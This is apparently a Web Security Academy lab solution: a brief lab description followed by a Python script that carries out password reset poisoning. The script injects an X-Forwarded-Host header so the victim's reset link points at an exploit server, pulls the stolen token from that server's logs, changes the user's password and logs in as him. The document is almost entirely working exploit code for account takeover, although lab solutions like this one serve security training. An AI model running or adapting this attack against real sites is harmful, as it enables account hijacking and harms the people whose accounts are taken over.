# Password reset poisoning via middleware

> This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

```python
import requests
import re

# Configuration
BASE_URL = "https://0a5000d204ce5b7982c606c1002e0031.web-security-academy.net/"
EXPLOIT_SERVER_HOST = "exploit-0a0800d604c15bb982a6054d01a2007b.exploit-server.net"
EXPLOIT_LOG_URL = f"https://{EXPLOIT_SERVER_HOST}/log"

def fetch_reset_token():
    """Extracts the poisoned password reset token directly from the exploit server access logs."""
    response = requests.get(EXPLOIT_LOG_URL)
    
    # Using regex to find all tokens in the raw text
    matches = re.findall(r"temp-forgot-password-token=([a-zA-Z0-9]+)", response.text)
    
    if matches:
        # The victim's click will typically be the most recent (last) entry in the log
        latest_token = matches[-1]
        print(f"[+] RESET TOKEN EXTRACTED: {latest_token}")
        return latest_token
        
    print("[-] Failed to find reset token in logs.")
    return None

def execute_exploit(target_url, exploit_host):
    session = requests.Session()
    forgot_password_endpoint = f"{target_url}forgot-password"

    # 1. Poisoning Phase: Inject malicious Host header to route the reset link to the exploit server
    print("[*] Initiating password reset poisoning...")
    poison_payload = {"username": "carlos"}
    malicious_headers = {"X-Forwarded-Host": exploit_host}
    
    response = session.post(
        forgot_password_endpoint, 
        data=poison_payload, 
        headers=malicious_headers
    )
    
    if response.status_code == 200:
        print("[+] MALICIOUS HEADER INJECTED SUCCESSFULLY")
    else:
        print("[-] Failed to trigger password reset.")
        return

    # 2. Extraction Phase
    reset_token = fetch_reset_token()
    if not reset_token:
        return

    # 3. Execution Phase: Use the intercepted token to change the victim's password
    print("[*] Executing password reset...")
    reset_params = {"temp-forgot-password-token": reset_token}
    new_password_payload = {
        "temp-forgot-password-token": reset_token,
        "new-password-1": "sithum",
        "new-password-2": "sithum"
    }
    
    reset_response = session.post(
        forgot_password_endpoint, 
        data=new_password_payload, 
        params=reset_params
    )
    
    if reset_response.status_code in [200, 302]:
        print("[+] PASSWORD CHANGED SUCCESSFULLY")
    else:
        print("[-] Password reset execution failed.")
        return

    # 4. Verification Phase: Log into the compromised account
    print("[*] Verifying account takeover...")
    login_endpoint = f"{target_url}login"
    login_credentials = {
        "username": "carlos",
        "password": "sithum"
    }
    
    login_response = session.post(login_endpoint, data=login_credentials)
    if "Log out" in login_response.text:
        print("[+] TARGET SECURED: SUCCESSFULLY LOGGED IN AS CARLOS")
    else:
        print("[-] Login verification failed.")

if __name__ == "__main__":
    execute_exploit(BASE_URL, EXPLOIT_SERVER_HOST)
```